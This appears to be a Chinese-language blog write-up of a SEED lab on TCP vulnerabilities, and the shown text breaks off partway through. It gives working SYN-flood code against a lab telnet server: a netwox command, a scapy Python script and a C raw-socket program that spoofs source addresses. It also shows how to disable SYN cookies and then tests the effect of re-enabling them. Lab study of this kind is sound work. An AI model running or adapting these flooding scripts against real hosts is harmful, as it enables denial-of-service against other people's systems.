<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>TCP协议漏洞利用 | Imane&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="环境：Ubuntu Seed，docker容器，其中Seed主机作为攻击机，两个docker容器由Seed镜像创建，作为server和user。 前置知识：  docker容器的使用  容器查看：docker ps -a 容器创建：docker run -it --name&#x3D;user --privileged &quot;seedubuntu&quot; &#x2F;bin&#x2F;bash-i指创建交互式容器，-">
<meta property="og:type" content="article">
<meta property="og:title" content="TCP协议漏洞利用">
<meta property="og:url" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="Imane&#39;s Blog">
<meta property="og:description" content="环境：Ubuntu Seed，docker容器，其中Seed主机作为攻击机，两个docker容器由Seed镜像创建，作为server和user。 前置知识：  docker容器的使用  容器查看：docker ps -a 容器创建：docker run -it --name&#x3D;user --privileged &quot;seedubuntu&quot; &#x2F;bin&#x2F;bash-i指创建交互式容器，-">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood7.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood3.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood1.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood2.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood4.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood5.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood8.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood9.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood_scapy1.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood_scapy2.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood10.png">
<meta property="og:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood11.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset2.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset1.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset3.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset4.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset5.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset6.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset7.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset8.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset9.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset10.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset11.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset12.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset13.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset14.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset15.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof2.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof1.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof3.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof4.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof5.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof6.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof7.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof13.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof8.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof9.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof10.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof14.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof11.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof12.png">
<meta property="og:image" content="https://imane219.github.io/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/spoof15.png">
<meta property="article:published_time" content="2021-04-19T13:29:54.000Z">
<meta property="article:modified_time" content="2021-05-17T07:43:26.427Z">
<meta property="article:author" content="Imane">
<meta property="article:tag" content="TCP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://imane219.github.io/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood7.png">
  
    <link rel="alternate" href="/project/atom.xml" title="Imane&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/project/css/style.css">

<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/project/" id="logo">Imane&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/project/">Home</a>
        
          <a class="main-nav-link" href="/project/archives">Archives</a>
        
          <a class="main-nav-link" href="/project/categories">Categories</a>
        
          <a class="main-nav-link" href="/project/tags">Tags</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/project/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://Imane219.github.io/project"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-TCP协议漏洞利用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="article-date">
  <time datetime="2021-04-19T13:29:54.000Z" itemprop="datePublished">2021-04-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      TCP协议漏洞利用
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>环境：</strong>Ubuntu Seed，docker容器，其中Seed主机作为攻击机，两个docker容器由Seed镜像创建，作为server和user。</p>
<p><strong>前置知识：</strong></p>
<ol>
<li><p><strong>docker容器的使用</strong></p>
<ul>
<li>容器查看：<code>docker ps -a</code></li>
<li>容器创建：<code>docker run -it --name=user --privileged &quot;seedubuntu&quot; /bin/bash</code>-i指创建交互式容器，-t指终端，输入exit退出终端</li>
<li>容器启用/停止：<code>docker start/stop 容器名</code></li>
<li>进容器的命令行：<code>docker exec -it 容器名 /bin/bash</code>，用这个指令退出容器不会导致容器的停止</li>
<li>删除容器：<code>docker rm 容器名</code></li>
</ul>
</li>
<li><p><strong>netwox工具</strong></p>
<p>包含超过200个不同功能的网络报文生成工具，每个工具都有一个特定的编号。</p>
</li>
<li><p><strong>scapy工具</strong></p>
<p>使用<code>apt get install python-scapy</code>下载scapy。</p>
</li>
</ol>
<h3 id="1-SYN-Flooding攻击"><a href="#1-SYN-Flooding攻击" class="headerlink" title="1.SYN Flooding攻击"></a>1.SYN Flooding攻击</h3><p><strong>原理：</strong>大量发送TCP SYN报文，让服务器忙于响应导致崩溃</p>
<p><strong>过程：</strong></p>
<p>要攻击成功首先需要关闭linux的SYNCookie保护，命令：<code>sudo sysctl -w net.ipv4.tcp_syncookies=0</code>或者<code>echo 0 &gt; /proc/sys/net/ipv4/tcp_syncookies</code>，我们先关闭保护查看攻击成功的情况，再将其打开查看成功防御SYN-Flooding攻击的情况。</p>
<ol>
<li><p><strong>netwox</strong></p>
<p>首先在服务器打开telnet服务：<code>/etc/init.d/openbsd-inetd start telnet</code>，接着用户机登入telnet，命令：<code>telnet 172.17.0.2(服务器ip)</code>，账号：seed，密码：dees。能够正常登入：</p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood7.png"></p>
<p>此时如果查看服务器连接状态（在服务器中输入：<code>netstat -na</code>），可以看到有两个tcp连接，一个是刚和用户建立好的连接，另一个是等待用户输入指令的LISTEN状态端口。</p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood3.png"></p>
<p>接着可以开始攻击，我们在攻击机输入<code>netwox</code>进入netwox界面，输入3搜索syn可以看到76号工具可以实施synflood攻击：</p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood1.png"></p>
<p>输入4根据提示来完成攻击，可以看到-i表示目的ip，-p表示目的端口，我们选择攻击服务器的telnet端口23，根据提示我们知道在终端直接使用命令<code>netwox 76 -i 172.17.0.2 -p 23 </code>即可实施攻击。</p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood2.png"></p>
<p>此时再次查看服务器的网络状态，可以看到很多半开的TCP连接（状态为SYN_RECV)</p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood4.png"></p>
<p>如果这时客户机尝试登入telnet，发现会一直等待直到超时，说明攻击成功。</p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood5.png"></p>
<p>接下来<strong>打开syn_cookies</strong>，查看攻击效果，可见服务器仍然收到很多半开TCP连接，但是客户机还是可以正常登入telnet.</p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood8.png"></p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood9.png"></p>
</li>
<li><p><strong>scapy</strong></p>
<p>首先编写python脚本执行syn flood攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding:utf-8       #避免中文乱码</span></span><br><span class="line"><span class="comment">### syn_flood.py</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP, TCP, send</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">a = IP(dst=<span class="string">&quot;172.17.0.2&quot;</span>) <span class="comment">#source address不填充默认是自己的ip</span></span><br><span class="line">b = TCP(sport=<span class="number">1551</span>, dport=<span class="number">23</span>, seq=<span class="number">1551</span>, flags=<span class="string">&#x27;S&#x27;</span>) <span class="comment">#flag = &#x27;S&#x27;表示发送syn报文，如果是还要加上ACK报文，flag = &#x27;SA&#x27;</span></span><br><span class="line">pkt = a/b <span class="comment">#IP层链接TCP层,从低层到高层</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pkt[<span class="string">&#x27;IP&#x27;</span>].src = <span class="built_in">str</span>(IPv4Address(getrandbits(<span class="number">32</span>))) <span class="comment">#ip首部随机化再发送出去</span></span><br><span class="line">    send(pkt, verbose = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#scapy发包很慢，不能完成DDOS攻击</span></span><br></pre></td></tr></table></figure>

<p>使用<code>python syn_flood.py</code>命令执行脚本，可以看到服务器收到了一些半开连接，但是数量没有netwox多，因为高级语言的执行速度相对较慢</p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood_scapy1.png"></p>
<p>此时用户尝试登入telnet，是可以正常登入的，但是会很慢</p>
<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood_scapy2.png"></p>
<p><strong>打开syn_cookies</strong>更是能够成功访问服务器的telnet服务，效果和上面的netwox攻击一样。</p>
</li>
<li><p>C</p>
<p>编写c程序实现syn flood攻击，使用命令<code>gcc -g syn_flooding.c -o syn_flood</code>编译攻击程序，使用 命令<code>./syn_flood</code>执行攻击。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEST_IP    <span class="meta-string">&quot;172.17.0.2&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEST_PORT  23  <span class="comment">// Attack the web server</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_LEN 1500</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">calculate_tcp_checksum</span><span class="params">(struct ipheader *ip)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_raw_ip_packet</span><span class="params">(struct ipheader* ip)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">  Spoof a TCP SYN packet.</span></span><br><span class="line"><span class="comment">*******************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> buffer[PACKET_LEN];</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (struct ipheader *) buffer;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcpheader</span> *<span class="title">tcp</span> =</span> (struct tcpheader *) (buffer +</span><br><span class="line">                                   <span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line"></span><br><span class="line">   srand(time(<span class="number">0</span>)); <span class="comment">// Initialize the seed for random # generation.</span></span><br><span class="line">   <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">     <span class="built_in">memset</span>(buffer, <span class="number">0</span>, PACKET_LEN);</span><br><span class="line">     <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">        Step 1: Fill in the TCP header.</span></span><br><span class="line"><span class="comment">     ********************************************************/</span></span><br><span class="line">     tcp-&gt;tcp_sport = rand(); <span class="comment">// Use random source port</span></span><br><span class="line">     tcp-&gt;tcp_dport = htons(DEST_PORT);</span><br><span class="line">     tcp-&gt;tcp_seq   = rand(); <span class="comment">// Use random sequence #</span></span><br><span class="line">     tcp-&gt;tcp_offx2 = <span class="number">0x50</span>;</span><br><span class="line">     tcp-&gt;tcp_flags = TH_SYN; <span class="comment">// Enable the SYN bit</span></span><br><span class="line">     tcp-&gt;tcp_win   = htons(<span class="number">20000</span>);</span><br><span class="line">     tcp-&gt;tcp_sum   = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">        Step 2: Fill in the IP header.</span></span><br><span class="line"><span class="comment">     ********************************************************/</span></span><br><span class="line">     ip-&gt;iph_ver = <span class="number">4</span>;   <span class="comment">// Version (IPV4)</span></span><br><span class="line">     ip-&gt;iph_ihl = <span class="number">5</span>;   <span class="comment">// Header length</span></span><br><span class="line">     ip-&gt;iph_ttl = <span class="number">50</span>;  <span class="comment">// Time to live</span></span><br><span class="line">     ip-&gt;iph_sourceip.s_addr = rand(); <span class="comment">// Use a random IP address</span></span><br><span class="line">     ip-&gt;iph_destip.s_addr = inet_addr(DEST_IP);</span><br><span class="line">     ip-&gt;iph_protocol = IPPROTO_TCP; <span class="comment">// The value is 6.</span></span><br><span class="line">     ip-&gt;iph_len = htons(<span class="keyword">sizeof</span>(struct ipheader) +</span><br><span class="line">                         <span class="keyword">sizeof</span>(struct tcpheader));</span><br><span class="line"></span><br><span class="line">     <span class="comment">// Calculate tcp checksum</span></span><br><span class="line">     tcp-&gt;tcp_sum = calculate_tcp_checksum(ip);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">       Step 3: Finally, send the spoofed packet</span></span><br><span class="line"><span class="comment">     ********************************************************/</span></span><br><span class="line">     send_raw_ip_packet(ip);</span><br><span 